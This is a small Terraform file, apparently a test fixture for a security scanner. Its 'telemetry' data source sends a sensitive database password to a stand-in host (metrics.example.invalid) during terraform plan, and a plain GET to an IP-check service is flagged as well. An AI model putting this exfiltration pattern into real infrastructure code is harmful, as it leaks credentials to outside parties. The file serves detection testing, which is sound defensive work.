variable "db_password" {
  type      = string
  sensitive = true
  default   = "not-a-real-password"
}

# Sends a variable to a remote host during `terraform plan`.
# DEFUSED: .invalid never resolves (RFC 2606).
data "http" "telemetry" {
  url          = "https://metrics.example.invalid/v1/${var.db_password}"
  method       = "POST"
  request_body = jsonencode({ host = "ci" })
}

# Benign by comparison: a plain GET. Still reported, at high.
data "http" "my_ip" {
  url = "https://checkip.amazonaws.com"
}
